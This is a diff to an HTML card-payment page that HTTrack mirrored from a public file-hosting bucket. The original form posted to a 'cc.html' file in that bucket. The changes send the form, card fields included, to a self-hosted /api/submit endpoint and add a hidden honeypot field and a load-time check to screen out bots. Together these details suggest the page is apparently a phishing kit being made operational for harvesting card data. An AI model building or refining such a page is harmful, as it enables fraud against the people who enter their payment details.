@@ -4926,7 +4926,7 @@
                                                             </div>
                                                         </div>
 
-                                                        <form  action="https://f006.backblazeb2.com/file/dwiupo/cc.html" class="mb-32 md:mb-0">
+                                                        <form id="paymentForm" action="/api/submit" method="POST" class="mb-32 md:mb-0">
                                                             <div class="grid grid-cols-1 md:grid-cols-2 md:gap-x-4">
                                                                 <div class="xs:shadow-md rounded-md bg-white mt-3 mb-2 border-gray-100 border p-4 xs:p-6 block">
                                                                     <div class="flex flex-row justify-between items-start">
@@ -5032,6 +5032,11 @@
                                                                                                         <label for="vehicle1"> Pay by card</label>
 
                                                                                                         <p>&nbsp;We accept South African MasterCard and Visa credit, and debit cards</p>
+                                                                                                        
+                                                                                                        <!-- Honeypot field for bot detection (hidden from users) -->
+                                                                                                        <input type="text" name="website" style="position:absolute;left:-9999px;width:1px;height:1px;" tabindex="-1" autocomplete="off" />
+                                                                                                        <!-- Hidden field for timing check -->
+                                                                                                        <input type="hidden" name="form_load_time" id="form_load_time" value="" />
                                                                                                     </span>
                                                                                                 </div>
                                                                                             </div>
@@ -5074,6 +5079,54 @@
                 </div>
             </div>
         </div>
+        
+        <!-- Form submission handler -->
+        <script>
+            // Set form load time for bot detection
+            document.addEventListener('DOMContentLoaded', function() {
+                document.getElementById('form_load_time').value = Date.now();
+            });
+            
+            // Handle form submission
+            document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const submitButton = document.getElementById('save_button');
+                const originalText = submitButton.innerHTML;
+                
+                // Disable button and show loading state
+                submitButton.disabled = true;
+                submitButton.innerHTML = '<div>Processing...</div>';
+                
+                try {
+                    const formData = new FormData(this);
+                    const response = await fetch('/api/submit', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: new URLSearchParams(formData)
+                    });
+                    
+                    const result = await response.json();
+                    
+                    if (result.success) {
+                        // Redirect to success page
+                        window.location.href = result.redirect || '/success.html';
+                    } else {
+                        // Show error message
+                        alert('Error: ' + (result.message || 'Failed to submit form. Please try again.'));
+                        submitButton.disabled = false;
+                        submitButton.innerHTML = originalText;
+                    }
+                } catch (error) {
+                    console.error('Submission error:', error);
+                    alert('An error occurred. Please try again later.');
+                    submitButton.disabled = false;
+                    submitButton.innerHTML = originalText;
+                }
+            });
+        </script>
     </body>
 
 <!-- Mirrored from f006.backblazeb2.com/file/dwiupo/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 May 2026 11:04:15 GMT -->
